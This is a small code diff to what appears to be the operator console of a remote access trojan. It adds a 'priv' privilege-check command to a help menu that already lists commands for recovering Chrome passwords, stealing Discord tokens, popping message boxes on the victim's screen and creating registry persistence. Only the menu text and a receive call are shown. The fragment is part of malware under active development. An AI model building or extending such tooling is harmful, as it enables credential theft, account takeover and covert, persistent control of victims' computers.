@@ -161,6 +161,7 @@ def target_communication(target, ip):
             msgbox                             --> show msgbox ex:msgbox|yourtitle|yourtext
             chrome_recon                       --> recover Chrome Passwords
             disteal                            --> Get Discord tokens
+            priv                               --> Check User Priv
             persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
         else:
             result = reliable_recv(target)
